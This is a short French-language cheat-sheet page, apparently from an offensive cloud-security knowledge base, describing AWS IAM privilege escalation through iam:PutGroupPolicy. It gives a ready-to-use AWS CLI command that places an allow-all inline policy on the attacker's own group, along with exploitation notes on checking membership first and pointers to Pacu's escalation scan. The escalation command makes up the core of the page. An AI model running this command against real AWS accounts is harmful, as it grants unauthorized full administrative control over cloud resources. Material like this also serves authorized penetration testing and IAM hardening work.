---
title: "PutGroupPolicy : intégrer en ligne une politique autorisant tout sur votre groupe"
description: "iam:PutGroupPolicy pour intégrer en ligne une politique autorisant tout sur un groupe auquel vous appartenez."
keywords:
  - PutGroupPolicy
  - inline policy
  - group
  - allow-all
  - policy
---

# PutGroupPolicy

`iam:PutGroupPolicy` intègre en ligne une politique sur un groupe. Chaque membre en hérite : intégrer en ligne une instruction autorisant tout sur un groupe qui contient votre utilisateur vous élève donc.

## Intégrer en ligne sur votre groupe

```bash
aws iam put-group-policy --group-name <your-group> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

## Notes d'exploitation

- Vérifiez d'abord l'appartenance avec `list-groups-for-user`.
- Les politiques de groupe en ligne se lisent avec `list-group-policies` / `get-group-policy`, et non avec les appels relatifs aux politiques attachées.

## Outils

- **AWS CLI** (`iam put-group-policy`).
- **Pacu** (`iam__privesc_scan`).

## Références

- [Rhino Security Labs : élévation de privilèges AWS (PutGroupPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
